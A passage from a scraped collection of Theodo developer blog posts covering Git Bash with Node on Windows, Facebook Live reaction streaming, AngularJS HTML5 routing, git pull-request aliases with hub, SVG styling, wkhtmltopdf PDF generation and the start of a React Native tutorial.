know more about how to build great Ansible playbook, this article may give you some ideas.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMaxime Thoonsen\r\n  \t\t\t\r\n  \t\t\t\tEducation Hacker. Full Stack developer - Agile and Lean Coach\r\nTwitter: https://twitter.com/maxthoon\r\nGithub: https://github.com/MaximeThoonsen  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIf you are used to develop on Linux and you have to suddenly switch back to Windows for a particular project, it can be really painful to use native tools like putty or power shell to develop.\nDon\u2019t worry, there are plenty of solutions to make things right.\nFor example, you could work on a Linux virtual machine inside your Windows.\nAnother solution (the one I chose) is to use Git Bash.\nThis setup has several advantages:\n\nIt requires no installation, which means it can be set up without admin rights\nIt is rather lightweight and easily packageable\nYou still have access to your windows filesystem via your command line\n\nWe are going to configure and package nodejs/npm inside the Git Bash to share it with every developers of your new team.\nGet the softwares\nFirst, get the desired softwares and add these to C:\\Applications\\ (where you will have sufficient rights to execute them):\n\nDownload Git for Windows Portable (\u201cthumbdrive edition\u201d) > HERE < and install it (ex: in C:\\Applications\\git)\nDownload node with npm zip package > HERE < and unzip it (ex: in C:\\Applications\\node)\n\nGit portable edition comes with Git Bash included.\nYou should now have a folder which looks like this :\nApplications\r\n\u251c\u2500 git\r\n\u2502  \u251c\u2500 git_bash.exe\r\n\u2502  \u2514\u2500 etc\r\n\u2502     \u251c\u2500 profile (edited)\r\n\u2502     \u2514\u2500 node_env.conf\r\n\u2514\u2500 node\r\n   \u251c\u2500 node\r\n   \u2514\u2500 npm\r\n\nConfigure your shell\nIn git Bash, a Linux like environement is simulated so you can access your Linux filesystem with Linux style paths.\nFor example, to print the content of C:\\Applications\\\u00a0you can type:\nls /c/Applications\r\n\nOpen git bash and type the following command:\nexport PATH=$PATH:/c/Applications/node\r\n\nType then node --version and npm --version to check that node and npm are available.\nIf not, check that you have the npm and node.exe files in C:\\Applications\\node.\nTo reproduce this configuration when launching your terminal, you can create a custom configuration file in C:\\Applications\\git\\etc\\node_env.conf :\n# Include node PATH\r\nPATH=$PATH:/c/Applications/node\r\n\nEdit your etc/profile git bash file (Windows location: C:\\Applications\\git\\etc\\profile) and add the following line just before exporting the PATH:\nsource \"etc/node_env.conf\"\r\n\nYou should then be able to use npm and node out of the box!\nFor example, if you want to contribute to this planning burndown chart project:\ngit clone https://github.com/theodo/planning-bdc.git && cd planning-bdc\r\nnpm install\r\nnpm run watch\r\n\nAnd here you go!\nUse SSH in your shell\nAnd now how about using SSH to connect to github?\nIndeed, Git Bash comes with a lot of features from Linux like grep, find, sed, and even ssh and scp!\nTo create a SSH key:\nssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\nAs in Linux, the key file location will be in ~/.ssh:\ncat $HOME/.ssh/id_rsa.pub\nAdd it to Github and run:\ngit clone git@github.com:theodo/planning-bdc.git && cd planning-bdc\r\nnpm install\r\nnpm run watch\r\n\nAnd here you go again!\nSet up your proxies (optional)\nIf you get stuck when using git clone or npm install, you may be blocked by a proxy (which requires configuration as well). Find out what the address is following this process.\nAdd the following lines to your node_env.conf :\n\r\nif [ -f \"etc/node_env.var\" ];\r\nthen\r\n  source \"etc/node_env.var\"\r\nelse\r\n  touch etc/node_env.var\r\n\r\n  read -p \"What is your proxy login? \" PROXY_LOGIN\r\n  echo \"PROXY_LOGIN=\\\"${PROXY_LOGIN}\\\"\" >> etc/node_env.var\r\n\r\n  read -p \"What is your proxy password? \" PROXY_PASSWORD\r\n  echo \"PROXY_PASSWORD=\\\"${PROXY_PASSWORD}\\\"\" >> etc/node_env.var\r\n\r\n  PROXY_ADDRESS=\"proxy.address.com\"\r\n  echo \"PROXY_ADDRESS=\\\"${PROXY_ADDRESS}\\\"\" >> etc/node_env.var\r\n\r\n  PROXY_PORT=\"8080\"\r\n  echo \"PROXY_PORT=\\\"${PROXY_PORT}\\\"\" >> etc/node_env.var\r\nfi\r\n\r\n# Used for Node Terminal proxy (for packages as shipit)\r\nexport HTTP_PROXY=http://${PROXY_LOGIN}:${PROXY_PASSWORD}@${PROXY_ADDRESS}:${PROXY_PORT}\r\nexport HTTPS_PROXY=https://${PROXY_LOGIN}:${PROXY_PASSWORD}@${PROXY_ADDRESS}:${PROXY_PORT}\r\n#\u00a0Npm proxy\r\nnpm config set proxy $HTTP_PROXY\r\nnpm config set https-proxy $HTTPS_PROXY\r\n# Git proxy\r\ngit config --global http.proxy $HTTP_PROXY\r\ngit config --global https.proxy $HTTPS_PROXY\r\n\nThis piece of bash code will :\n\nCheck if a node_env.var file exists\nIf true, it will import it\nIf false, it will create it and fill it with the PROXY_LOGIN, PROXY_PASSWORD, PROXY_ADDRESS and PROXY_PORT variables\nThen it will configure your node, npm and git with the proxy\n\nBe careful with your HTTPS proxy, it might have a different address / port than your http proxy\nStart your Git Bash and you should be asked for the proxy variables. You should now be able to use git clone and npm install for your applications!\nYou can also use the integrated ssh client.\nIf you need to change the variables, destroy the node_env.var file and you will be asked for new values.\nConclusion\nNow you got a configured and packaged Git Bash, you can adapt it to create your own environement!\nThanks for reading, don\u2019t hesitate to leave feedback!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Ng\u00f4-Ma\u00ef\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tFacebook released its new feature: the Live Video.\nYou\u2019re surely aware that America elected a new president and you may remember the buzz of that night: the live from ABC News asking who will win, by making people vote through the Facebook reactions.\nLike the live for Trump, love it for Hillary.\nThe video had more than a hundred thousands reactions and millions of views.\nI want it too!\nSo some friends and I wanted to try it for our FB page.\nThere are multiple services online that offer to do it for you.\nI\u2019m going to show you how to do it for free \ud83d\ude00\nHow does it work?\nBasically you need:\n\nA Facebook page\nOBS\nA web page you want to stream\nThe process\n\nThe development of the webpage you want to stream is what takes the longest.\nHowever, very little knowledge is needed to get this working.\nHow to stream?\nFor a Facebook live, you need to stream a video right?\nWe\u2019ll use OBS, a simple tool to stream anything from your webcam, an image, a sound, a local HTML page or a website.\nDo you see where this is going?\nWhat to stream?\nWell\u2026 We\u2019ll stream an HTML page displaying whatever you like but above all: the interactions your viewers had with the video, like reactions (like, love, etc) or comments!\nThe HTML page\nI\u2019m not going to enter into HTML CSS JS details (I\u2019ve done it with JQuery), just the main tips.\nIf you want to look at some code, here ya go!\nDon\u2019t judge!\nFirst you need to get the reactions inside a refreshCounts function:\n\r\nfunction refreshCounts() {\r\n  var url = 'https://graph.facebook.com/v2.8/?ids=' + postID + '&fields=' + reactions + '&access_token=' + access_token;\r\n  $.getJSON(url, function(res){\r\n    //do stuff with the result\r\n  }\r\n}\r\n\n\nWe use the facebook Graph API.\nAs you see it needs:\n\na postID\nan access token\nreactions\n\nFor the reactions:\n\r\nvar reactions = ['LIKE', 'LOVE', 'WOW', 'HAHA', 'SAD', 'ANGRY'].map(function (e) {\r\n    var code = 'reactions_' + e.toLowerCase();\r\n    return 'reactions.type(' + e + ').limit(0).summary(total_count).as(' + code + ')'\r\n}).join(',');\r\n\n\nYou can try the Graph API with one of your post, I let you check on the Internet how to get the ID of a post. for a live its simple, just click on the video and the post id is the last part of url.\nFor example: https://www.facebook.com/newtrackfr/videos/1240079556075061.\nFor the access token you can get it on the explorer page.\nNow you have something like this:\n\r\nvar postID = 1240079556075061\r\nvar access_token = a3very5long36token\r\nfunction refreshCounts() {\r\n  // stuff\r\n}\r\n\n\nGreat, you can work with the reactions of a post.\nI suggest to work with a random Facebook live, to see if the reactions, the comments, or whatever you want to get from the post is updated on your webpage.\nBut it\u2019s not very interactive yet\u2026 Because it\u2019s not live.\nGet Live!\nNow let\u2019s walk through the steps to get a live video:\n\non your FB page create a live post\nget the Stream key of your FB live, save it somewhere\nopen OBS, add a source, like the background of the page you want to stream\nin OBS preferences -> Stream -> Stream Key : paste your stream key\nstream with OBS\nback on Facebook click on next, and when the stream is ok launch the live\nget the postID of your live and put it in your webpage\nin OBS, stream the html page (or the website)\nphase 3: profit\n\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSammy Teillet\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAngularJS routing system is great to create RESTful single-page applications, but it comes at the cost of accepting the # fragment in all your urls. There are several reasons you would like to drop this tiny character:\n\nSearch Engine Optimization (SEO) considerations\nUse Anchors in your pages and urls\n\nGood news, you can easily configure your application to go from:\nmyapp.com/#/my/angular/routes\nTo:\nmyapp.com/my/angular/routes\nThere are two things that need to be done:\n\nConfiguring AngularJS to enable HTML5 mode\nConfiguring your backend framework to redirect all non-REST and non-static-asset HTTP requests to the frontend index.html\n\nConfiguring your backend is necessary to tell your server to redirect the \u201c/my/angular/routes\u201d to the angular app, and avoid getting 404 errors. Here I will be using Loopback as an example of REST API framework, but it can be easily adapted to other frameworks like Spring or Symfony.\nStep 1: Configuring AngularJS to enable HTML5 mode\nThis step will depend on which version of Angular you\u2019re using.\nAngular 1 with angular-route or angular-ui-router\nWhen you set your angular application configuration, you simply have to use the $locationProvider module and set html5Mode to true.\nangular.module('app')\r\n  .config(config)\r\n\r\nconfig.$inject = ['$locationProvider'];\r\nfunction config($locationProvider) {\r\n  $locationProvider.html5Mode(true);\r\n}\r\n\nTo tell Angular what is the base path of your application, provide a base tag to your index.html\n\r\n<!doctype html>\r\n<html>\r\n  <head>\r\n    <meta charset=\"utf-8\">\r\n    <base href=\"/\">\r\n  </head>\r\n\nAngular 2\nThe equivalent of HTML5 mode in Angular 2 is to use the PathLocationStrategy as the router strategy.\n\r\nimport {ROUTER_PROVIDERS, APP_BASE_HREF} from 'angular2/router';\r\n\r\nbootstrap(yourApp, [\r\n  ROUTER_PROVIDERS, // includes binding to PathLocationStrategy\r\n  provide(APP_BASE_HREF, {useValue: '/'})\r\n]);\r\n\nYou can edit the APP_BASE_HREF to define your application base path\nprovide(APP_BASE_HREF, {useValue: '/my/app/path'})\nStep 2: Configuring your backend\nThe above configuration will work on its own until you try to access an angular route directly with its url, because your web server won\u2019t know he has to redirect this url to your angular application.\nTo fix that, you must configure your backend framework to redirect all your angular route urls to the index.html.\nTo do this, add a filter to the server.js file.\nvar path = require('path');\r\n\r\n//List here the paths you do not want to be redirected to the angular application (scripts, stylesheets, templates, loopback REST API, ...)\r\nvar ignoredPaths = ['/vendor', '/css', '/js', '/views', '/api'];\r\n\r\napp.all('/*', function(req, res, next) {\r\n  //Redirecting to index only the requests that do not start with ignored paths\r\n  if(!startsWith(req.url, ignoredPaths))\r\n    res.sendFile('index.html', { root: path.resolve(__dirname, '..', 'client') });\r\n  else\r\n    next();\r\n});\r\n\r\nfunction startsWith(string, array) {\r\n  for(i = 0; i < array.length; i++)\r\n    if(string.startsWith(array[i]))\r\n      return true;\r\n  return false;\r\n}\r\n\nNow, all your requests that do not match the specified patterns will be taken care of by the angular routing system and not the Loopback one.\nThe only disadvantage is that you have to be careful when adding new assets or REST endpoints and be sure that their urls do not conflict with angular routes.\nConclusion\nCongratulations! You have a fully functional angular application without any trace of # in urls!\nWhat\u2019s next? You could dive deeper into Angular state management features and implement basic route authorization in AngularJS.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tGeorges Biaux\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAt Theodo a lot of our projects follow the Agile git workflow described in another article by my coworker Aurore.\nWith this worklow, we have to create 2 pull requests every time we finish a feature:\n\none for the staging branch that will be merged after the code review\none for the develop branch that will be merged once the feature has been validated and is ready to be shipped into production\n\nI was spending so much time doing these actions I thought \u201cHey maybe I can write a git alias to do this for me!\u201d\nIntroducing hub: the github CLI\nHub is a command-line wrapper built with the go language that enables you to do cool stuff with Github.\nFor example you can create pull requests, fork repositories or even create a new Github repository straight from your terminal!\nInstall hub\nOn Linux\nTo install hub you first need to install go first.\nAs for now the latest version of go is 1.7.3, to install it run the following commands:\ncurl https://storage.googleapis.com/golang/go1.7.3.linux-amd64.tar.gz > go1.7.3.linux-amd64.tar.gz\r\ntar -C /usr/local -xzf go1.7.3.linux-amd64.tar.gz\r\nexport PATH=$PATH:/usr/local/go/bin\r\n\nIf you want to install go on your system add the last line to your /etc/profile.\nOnce go is installed, run the following commands to install hub:\ngit clone https://github.com/github/hub.git && cd hub\r\nscript/build -o ~/bin/hub\r\n\nIf ~/bin/ is not already in your path, add the following line to your ~/.profile file:\nexport PATH=$PATH:$HOME/bin\r\n\nOn Mac\nTo install hub you first need to install go first:\nbrew install go\r\n\nIf you want to install go on your system add export PATH=$PATH:/usr/local/go/bin to your /etc/profile.\nOnce go is installed, run the following commands to install hub:\nbrew install hub\r\n\nCreate a git alias to create pull requests\nGit aliases are a great way to group your git-related shortcuts.\nI personnaly enjoy creating new ones, especially since I know that they can link to any Bash function.\nTo create an alias that will create your pull requests for staging and develop add this line to your ~/.gitconfig file in the alias section:\n    pr = \"!f(){ \\\r\n        hub pull-request -m \\\"$1\\\" -b staging -h `git rev-parse --abbrev-ref HEAD` -l \\\"Please Review\\\"; \\\r\n        hub pull-request -m \\\"$1\\\" -b develop -h `git rev-parse --abbrev-ref HEAD` -l \\\"Waiting for validation\\\"; \\\r\n    }; f\"\r\n\nWhat does it do?\nFirst we declare a bash function (it is not really needed here, except for code clarity).\nThen we execute two hub commands, which take the following arguments:\n\n-m \\\"$1\\\" sets the first argument passed to the git command as the pull request message\n-b staging and -b develop sets staging or develop as the base branch\n-h `git rev-parse --abbrev-ref HEAD` sets the current branch as the head branch\n-l \\\"Please Review\\\" adds the Please Review label to the pull request\n\nCreate pull requests faster than Bruce Almighty\n\u00a0\nIf I am on a branch called feature/a-completely-awesome-feature and I run this:\ngit pr \"Remove js console error\"\r\n\nIt will create both pull requests (on staging and on develop) from my feature branch on my Github remote and that took me less than 5 seconds!\n\nAdd\u00a0templates to your pull requests\nMy fellow Theodoer William wrote a git extension to handle pull request templates: if such a template is found, your editor will be prompted and prefilled with your template.\nYou\u2019ll also be able to check the commits in each pull request before opening them!\nHere\u2019s the link to the install guide: https://github.com/williamdclt/git-pretty-pull-request/pulls\n\u00a0\nIf you wish to improve this article or if you want to share other cool git aliases, please feel free to comment below!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLouis Zawadzki\r\n  \t\t\t\r\n  \t\t\t\tI drink tea and build web apps at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tWilliam Duclot\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhat is the SVG file format and why should I care?\nSVG stands for Scalable Vector Graphics.\nIt is a file format for vectorial images described using XML tags.\nSince it is vectorial, it presents a few advantages:\n\nit is lightweight\nyou can zoom it as much as you want without it getting blurry\nyou can dynamically modify it (colours, shapes)\n\nDynamically change your SVG using CSS\nThe SVG format can be directly included in a HTML document as a DOM element.\nEach stroke or shape is an object that can own a class\nKnowing this, we can add CSS styles for strokes and shapes, and dynamically modify the objects.\nWe will use the following SVG file to illustrate our examples (credits to Jean-R\u00e9mi Beaudoin for the very nice drawing skills!).\n\nThis is the content of the svg file:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<svg\r\n   xmlns:svg=\"http://www.w3.org/2000/svg\"\r\n   xmlns=\"http://www.w3.org/2000/svg\"\r\n   version=\"1.1\"\r\n   viewBox=\"0 0 100 100\"\r\n   height=\"100\"\r\n   width=\"100\">\r\n  <g\r\n     transform=\"translate(0,-952.36216)\">\r\n    <path\r\n       d=\"m 5,1021.1122 56.071429,-56.96433 -3.75,50.71433 z\"\r\n       class=\"my-path\"\r\n       fill=\"#9f9f9f\" />\r\n    <path\r\n       d=\"M 96.607142,1036.8265 5,1021.1122 l 52.321429,-6.25 z\"\r\n       fill=\"#7a7a7a\"\r\n       class=\"my-path\" />\r\n    <path\r\n       d=\"m 96.607142,1036.8265 -35.535713,-72.67863 -3.75,50.71433 z\"\r\n       fill=\"#e0e0e0\"\r\n       class=\"my-path\" />\r\n  </g>\r\n</svg>\r\n\nFor example, this will fill every svg path of the image with red:\npath {\r\n    fill: #ff0000;\r\n}\r\n\nSee the Pen wgKKMJ by Pierre Poupin (@Pierpo) on CodePen.\nYou can be more specific.\nYou can add classes to your SVG elements and select them independently:\n.first-element {\r\n    fill: #ff0000;\r\n}\r\n.second-element {\r\n    fill: #00ff00;\r\n}\r\n\nYou can even use the :hover and :active selectors, which is very nice to integrate nice buttons.\nSee the Pen EZadxE by Pierre Poupin (@Pierpo) on CodePen.\nUsing external SVG files\nNaive approach\nMost of the time, you won\u2019t copy and paste your SVG directly in your HTML page.\nYou naturally want to import your SVG as an image.\nThe most intuitive way would be to include it this way:\n<img src=\"my-svg.svg\">\r\n\nWhich totally works for an SVG as it is.\nHowever, including it like this prevents you from interacting with it.\nThe img field will make your browser import it as a black box, and no operation on anything inside it would be possible.\nThat means the above CSS examples would not work!\nUnfortunately, you will get the same behaviour if you use background-image: 'my-svg.svg'.\nOne simple way using Twig\nThus, we want the SVG and all its sub-elements to be well determined parts of our DOM as well as our SVG to be an external file.\nThere\u2019s a very simple way to do it using Twig! Simply use the source function in your template.\n{{ source('my-svg.svg') }}\r\n\nThis will copy the text present in the SVG file and put it in your generated HTML, thus make it a proper recursive and editable DOM element.\nThat\u2019s it!\nResources:\n\nhttps://css-tricks.com/using-svg/\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tPierre Poupin\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo. I live in my terminal. Too lazy to use another editor than Vim.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHave you ever tried to generate a pdf in your application? This year, I have. Twice.\nI\u2019m sure there are several means to this end. For example, one of my colleagues used phantomjs and then wrote an article\u00a0about his experience. But if I\u2019m here now, it\u2019s to tell you my story with wkhtmltopdf.\nIt all started in February when my client requested a feature that would allow him to print any page of the application we were building. When we started, we didn\u2019t know how to do it and we tried different tools. Some of these tools had issues with our NVD3 charts, others were incompatible with our security requirements.\nThen we discovered wkhtmltopdf!\n\nThe proof of concept\nThe way to use wkhtmltopdf is really simple:\n\nTake the html and give it to wkhtmltopdf\nTake the pdf and give it to the user\nTake a beer and give me one\n\nBut first of all you should know two or three things:\n\nWkhtmltopdf has dependencies. On Linux, I had to install zlib, fontconfig, freetype, and X11 libs\nWkhtmltopdf\u2019s current stable release is 0.12.4 and based on Qt 4.8.5 version. This is an old Qt version (used by Google Chrome 18/19/20) that does not support flexbox\u00a0for example\nAn alpha release based on Qt 5.4.2 (with an updated browser engine) is available\n\nNow let\u2019s dive into a real-world example! The front-end is based on an AngularJS 1 app.\nTake the html and give it to wkhtmltopdf\nSo first we need a button.\n// template.html\r\n\r\n<a ng-click=\"print()\">Print</a>\r\n\nThen we send the html to the backend to generate our pdf.\n// controller.js\r\n\r\n$scope.print = function() { \r\n  var html = document.getElementsByTagName('html')[0];\r\n  var body = {html: html.outerHTML};\r\n  $http.post('api/pdf/print', body, {responseType: 'arraybuffer'});\r\n}\r\n\nThe best way to use wkhtmltopdf in your backend is to install a wrapper. There are several wrappers, I used the first one I found.\n// package.json\r\n\r\n{ \r\n  \"dependencies\": { \r\n    \"wkhtmltopdf\": \"0.1.5\"\r\n  }\r\n}\nDon\u2019t forget to install the binary wkhtmltopdf in your project!\n// pdf.js\r\n\r\nvar wkhtmltopdf = require('wkhtmltopdf');\r\nmodule.exports = function(PDF) {\r\n  PDF.print = function(req, res, done) {\r\n    var html = req.body.html;\r\n    var projectLocation = __dirname + '/../../';\r\n    var CSSLocation = projectLocation + 'client/www/style/' + 'main.css';\r\n    var wkBinPath = projectLocation + 'bin/wkhtmltopdf';\r\n    wkhtmltopdf.command = wkBinPath;\r\n    var options = { 'user-style-sheet': CSSLocation, };\r\n    var stream = wkhtmltopdf(html, options);\r\n    done;\r\n  }\r\n}\r\n\nOf course, the projectLocation, CSSLocation and wkBinPath depend on the architecture of your project.\nTake the pdf and give it to the user\nCurrently, you still have nothing. But you\u2019ve done the hardest part!\nIndeed wkhtmltopdf generated a stream for you. Now you have to send the stream to your frontend.\n// pdf.js\r\n\r\n    var stream = wkhtmltopdf(html, options);\r\n    res.set('Content-Disposition', 'attachment; filename=transcript.pdf');\r\n    res.set('Content-Type', \"application/pdf\");\r\n    stream.pipe(res);\r\n    done;\nAnd make your user download it.\n// controller.js\r\n\r\n  $http.post('api/pdf/print', body, {responseType: 'arraybuffer'})\r\n  .success(function(response) { \r\n    var file = new Blob([ response ], {type: 'application/pdf'});\r\n    FileSaver.saveAs(file, 'print.pdf');\r\n  }\r\n)\nYou\u2019re going to need to install another dependency, FileSaver:\n// bower.json\r\n\r\n{ \r\n  \"dependencies\": {\r\n    \"angular-file-saver\": \"1.1.0\"\r\n  }\r\n}\nDon\u2019t forget to inject \u2018ngFileSaver\u2019 in your module!\nShare a drink and look at the result\nYou might get some issues, like this \u201csize issues\u201d:\n\nAnd it\u2019s certainly not what you wanted. But this is enough to say: \u201cI can do it!\u201d.\nIn the next article, we\u2019re going to see how to improve your pdf.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tVincent Langlet\r\n  \t\t\t\r\n  \t\t\t\tVincent Langlet is an agile web developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tMobile Apps are a crucial part of our daily life.\nYet, building a native mobile app for everyone requires to have knowledge in at least two languages: Java for Android and Swift or Objective-C for iOS.\nAt least, that\u2019s what I thought until I discovered React Native.\nWhat is React Native?\nReact Native is a framework to build native apps using only Javascript.\nFor the Javascript fan I am, it\u2019s a great opportunity.\nReact Native builds native apps, and not hybrid apps or \u00abHTML5\u00bb apps.\nThis is possible because the Javascript written is transformed into native UI blocks for Android or iOS.\nI suggest you check React Native\u2019s official website for more information.\nLet\u2019s jump into building our first mobile app.\nInstalling React Native\nThe first step is installing React Native \nI won\u2019t pretend explaining this better than what has already been done in the last few months.\nHowever, I have a few suggestions and links to share.\nTo install the CLI tools for React Native, you\u2019ll need Node.js (Node.js 6 works fine, I haven\u2019t tested other versions but React Native should work with Node.js 4 or newer).\nThen you can just run npm install -g react-native-cli to install React Native.\niOS\nIn order to develop an iOS app, you\u2019ll need a Mac with xCode (you can find it on the AppStore).\nIf you are using Linux, a great article has been published to help you develop iOS app on Linux.\nXCode comes up with a simulator, which we will use for development.\nAndroid\nTesting you application on an Android device is a bit tougher.\nThe best practices are described on React Native\u2019s website.\nHere are the main points:\n\nInstall Android Studio\nSet up paths\nexport ANDROID_HOME=~/Android/Sdk\r\nexport PATH=${PATH}:${ANDROID_HOME}/tools\r\n\n\nSet up Android Virtual Device (if not set up by Android Studio)\nandroid avd\r\n\n\n\nCreating and running a React Native App\nEverything in this article is summed up in this Github repository.\nTo create a React Native App run:\nreact-native init <YourAppNameHere>\r\n\nThen launch it on the simulator you want with :\nreact-native run-ios\r\nreact-native run-android\r\n\nYou should see the following screen on your emulator:\n\nModifying our app\nLet\u2019s enter the fun part!\nCreating our first cross platform mobile app!\nOpen you favorite editor and let\u2019s take a look at what React Native generated for us.\nThe whole code for this article is available here.\nWe have two files that represent our two entry points: one for iOS (index.ios.js) and one for Android (index.android.js).\nLet\u2019s play with the index.ios.js and change the text and style.\n<Text style={styles.welcome}>\r\n  Our first React Native App\r\n</Text>\r\n\nYou can see the changes in your emulator by pressing Ctrl+R or Cmd+R thanks to some live reloading.\nThis makes React Native development so much easier.\nHow does the styling work in React Native?\nThe sample app gives us an example of how the styling works in React Native.\nconst styles = StyleSheet.create({\r\n  container: {\r\n    flex: 1,\r\n    justifyContent: 'center',\r\n    alignItems: 'center',\r\n    backgroundColor: '#F5FCFF',\r\n  },\r\n});\r\n\nThere are two key points to have in mind when developing in React Native.\n\nReact Native uses flexbox for the design.\nIf you\u2019ve never used flexbox, here are two awesome links to master it in minutes \n\n\nA TD game\nA greatly written guide\n\n\nReact Native writes CSS styles in camel case.\n\n\nbackground-color => backgroundColor\nborder-width => borderWidth\n\nReact Native Components\nYou can find a list of components to use in React Native on their official website.\nFor our demo app, we\u2019ll use the navigation component given to us by RN : Navigator\nLet\u2019s create a src folder where the components inside will be used by both our Android and iOS app.\nInside our src folder, let\u2019s create a components folder and inside it two JS files : firstPage.js and secondPage.js\nfirstPage.js\nimport React, {Component} from 'react';\r\nimport {\r\n  StyleSheet,\r\n  Text,\r\n  TouchableHighlight,\r\n  View\r\n} from 'react-native';\r\n\r\nimport SecondPage from './secondPage';\r\n\r\nclass FirstPage extends Component {\r\n  static route(props) {\r\n    return {\r\n      id: 'FirstPage',\r\n      component: FirstPage\r\n    };\r\n  }\r\n\r\n  render() {\r\n    return (\r\n      <View style={styles.container}>\r\n        <Text>This is the first view</Text>\r\n        <TouchableHighlight onPress={() => this.props.navigator.push(SecondPage.route())}</TouchableHighlight>\r\n      </View>\r\n    );\r\n  }\r\n}\r\n\r\nconst styles = StyleSheet.create({\r\n  container: {\r\n    flex: 1,\r\n    justifyContent: 'center',\r\n    alignItems: 'center',\r\n    backgroundColor: '#FF00FF',\r\n  },\r\n});\r\n\r\nexport default FirstPage;\r\n\r\n\nsecondPage.js\nimport React, {Component} from 'react';\r\nimport {\r\n  StyleSheet,\r\n  Text,\r\n  View\r\n} from 'react-native';\r\n\r\nclass SecondPage extends Component {\r\n  static route(props) {\r\n    return {\r\n      id: 'FirstPage',\r\n      component: SecondPage\r\n    };\r\n  }\r\n\r\n  render() {\r\n    return (\r\n      <View style={styles.container}>\r\n        <Text>This is the second view</Text>\r\n      </View>\r\n    );\r\n  }\r\n}\r\n\r\nconst styles = StyleSheet.create({\r\n  container: {\r\n    flex: 1,\r\n    justifyContent: 'center',\r\n    alignItems: 'center',\r\n    backgroundColor: '#FFFF00',\r\n  },\r\n});\r\n\r\nexport default SecondPage;\r\n\nIn the FirstPage component, our button is a TouchableHighlight and it has a onPress method that pushes the second view.\nOur second page component just has a text.\nWe then need to set up our Navigator to go back and forth from one page to the other.\nFirst, in our index.ios.js, let\u2019s remove what\u2019s in the container View and add a Navigator:\nindex.ios.js\nrender() {\r\n  return (\r\n    <View style={styles.container}>\r\n      <Navigator\r\n        initialRoute={FirstPage.route()}\r\n        renderScene={this.renderScene}\r\n        style={styles.navigator} />\r\n    </View>\r\n  );\r\n}\r\n\nLet\u2019s analyze these lines.\n\nWe\u2019ve given our Navigator an initial route that will be displayed when loading our app.\nWe\u2019ve given a renderScene function that will render our different scenes.\nWe\u2019ll take a look at this function in a 